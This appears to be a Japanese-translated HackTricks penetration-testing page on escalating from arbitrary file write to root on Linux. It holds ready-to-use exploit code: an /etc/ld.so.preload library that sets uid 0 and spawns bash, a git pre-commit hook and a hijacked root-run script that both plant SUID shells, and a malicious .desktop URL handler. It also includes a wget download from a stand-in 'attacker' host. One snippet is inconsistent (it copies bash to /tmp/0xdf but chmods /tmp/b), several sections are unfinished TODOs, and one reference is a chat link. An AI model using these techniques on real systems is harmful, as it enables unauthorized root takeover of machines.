# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

このファイルは **`LD_PRELOAD`** env variable のように動作しますが、**SUID binaries** にも有効です。\
作成または変更できる場合、**実行される各バイナリで読み込まれるライブラリへのパスを追加**するだけで済みます。

例えば: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、gitリポジトリ内でコミットの作成やマージ... のようなさまざまな**イベント**で**実行される****スクリプト**です。したがって、**特権を持つスクリプトやユーザ**がこれらの操作を頻繁に行い、かつ**`.git` フォルダに書き込み**できる場合、これを利用して**privesc**することができます。

例えば、gitリポジトリの**`.git/hooks`**に**スクリプトを生成**しておけば、新しいコミットが作成されるたびに常に実行されるようにできます:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt_misc

`/proc/sys/fs/binfmt_misc` にあるファイルは、どのバイナリがどの種類のファイルを実行するかを示します。TODO: 一般的なファイルタイプが開かれたときにこれを悪用して rev shell を実行するための要件を確認してください。

### Overwrite schema handlers (like http: or https:)

被害者の設定ディレクトリに書き込み権限を持つ攻撃者は、システムの動作を変えるファイルを簡単に置き換えたり作成したりでき、意図しないコード実行を引き起こす可能性があります。`$HOME/.config/mimeapps.list` ファイルを変更して HTTP および HTTPS の URL ハンドラを悪意のあるファイルに向ける（例: `x-scheme-handler/http=evil.desktop` に設定する）ことで、攻撃者は **任意の http または https リンクをクリックした際に、その `evil.desktop` ファイルに指定されたコードが実行されるようにできます**。たとえば、`$HOME/.local/share/applications` にある `evil.desktop` に以下の悪意あるコードを配置すれば、外部の URL をクリックするたびに埋め込まれたコマンドが実行されます:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.

### Root が実行する user-writable なスクリプト/バイナリ

権限のあるワークフローが `/bin/sh /home/username/.../script`（または権限のないユーザーが所有するディレクトリ内の任意のバイナリ）のようなものを実行している場合、これをハイジャックできます：

- **実行を検出:** [pspy](https://github.com/DominicBreuker/pspy) でプロセスを監視し、root がユーザー制御下のパスを呼び出すのを捕捉します：
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** 対象ファイルとそのディレクトリが自分のユーザーによって所有され、書き込み可能であることを確認する。
- **Hijack the target:** 元のバイナリ/スクリプトをバックアップし、SUID shell (or any other root action) を作成するペイロードを配置してから、権限を元に戻す:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **特権アクションをトリガーする**（例：ヘルパーを起動するUIボタンを押す）。rootがhijacked pathを再実行したとき、`./rootshell -p`で権限昇格したシェルを取得する。

## 参考

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)

{{#include ../../banners/hacktricks-training.md}}
